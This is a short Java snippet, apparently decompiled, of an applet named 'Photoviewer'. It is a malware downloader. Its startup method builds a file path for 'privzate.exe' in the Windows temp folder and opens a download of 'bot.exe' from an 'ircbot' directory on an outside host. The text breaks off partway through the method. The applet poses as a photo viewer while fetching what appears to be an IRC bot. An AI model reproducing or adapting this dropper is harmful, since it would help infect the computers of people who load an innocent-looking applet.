...
public class Photoviewer extends Applet
{
    public static void startupAll() {
        try {
            final String concat = System.getenv("TMP").concat("\\privzate.exe");
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL("http://www.shockwavezz.co.cc/ircbot/bot.exe").openStream());
